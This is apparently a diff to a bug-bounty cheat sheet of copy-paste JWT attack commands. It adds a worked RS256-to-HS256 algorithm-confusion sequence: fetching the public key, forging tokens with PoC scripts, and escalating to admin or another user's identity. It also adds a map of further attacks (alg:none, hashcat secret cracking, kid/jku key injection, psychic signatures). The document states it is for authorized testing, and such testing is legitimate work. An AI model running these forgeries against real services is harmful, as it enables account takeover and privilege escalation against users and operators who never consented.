@@ -1,5 +1,7 @@
 # JWT Attack Arsenal — Copy-Paste Commands & Payloads, Bug-Bounty Edition
 
+**Author:** x8bitranjit
+
 > Companion to `JWT_TESTING_GUIDE.md`. **Pick by what `header.alg` is and what the baseline test told you** (guide §5, Appendix B). Replace `<TOKEN>`, `<URL>`, `YOUR-HOST`, and key paths. Authorized targets only; forge into your own test accounts and crack offline (guide §32).
 >
 > Set once:
@@ -8,6 +10,32 @@
 > URL='https://target.com/api/me'   # an endpoint that USES the token for authz
 > AUTH="Authorization: Bearer $TOKEN"
 > ```
+
+---
+
+## 0.0 The whole attack in one sequence (RS256→HS256 confusion, worked end-to-end in Guide §8.4)
+*Decode → baseline → forge-offline → escalate → stop. This is the signature-defining JWT money attack; the other §§ are the same skeleton with a different forge step (alg:none §2, crack HS §3, kid/jku §5/§6).*
+
+```bash
+# 1. DECODE — what is header.alg? (RS256 = asymmetric → try confusion FIRST)
+echo "$TOKEN" | cut -d. -f1 | tr '_-' '/+' | base64 -d; echo
+
+# 2. GET the public key (RS256 verifiers publish it) → JWK to PEM
+curl -s https://target.com/.well-known/jwks.json > jwks.json
+python3 -c 'import json,sys;from jwcrypto import jwk;k=jwk.JWK(**json.load(open("jwks.json"))["keys"][0]);sys.stdout.buffer.write(k.export_to_pem())' > public.pem
+#   (no JWKS? recover (n,e) from TWO tokens: rsa_sign2n/jwt_forgery.py <T1> <T2>  — guide §9)
+
+# 3. BASELINE the confusion — same claims, only alg flips to HS256; PoC tries every key-byte representation
+python3 poc/rs256_to_hs256.py "$TOKEN" --pubkey public.pem
+#   send each candidate to an authed identity endpoint; a 200 (not 401) = confusion LIVE + which representation wins
+
+# 4. ESCALATE — reuse the winning representation, tamper one claim
+python3 poc/rs256_to_hs256.py "$TOKEN" --pubkey public.pem --claim role=admin   # admin action succeeds = the finding
+python3 poc/rs256_to_hs256.py "$TOKEN" --pubkey public.pem --claim sub=1        # other user's identity = ATO
+
+# 5. STOP — one benign own-vs-another proof, redact key/token, report IMPACT. Forging was OFFLINE; nothing brute-forced at the server.
+```
+**Cash-out map by `alg` / baseline:** signature not verified (baseline) → **tamper any claim (Critical)** · `alg:none` accepted → **forge unsigned (Critical, §2)** · HS256 weak secret → **hashcat -m 16500 → re-sign (Critical, §3)** · RS256 + public key → **RS→HS confusion (Critical, above/§4)** · `kid`/`jku`/`jwk`/`x5c` attacker-influenced → **attacker key (Critical + often SSRF, §5/§6)** · ES256 on Java 15–18 → **psychic (0,0) signature (Critical, §7)**.
 
 ---
 
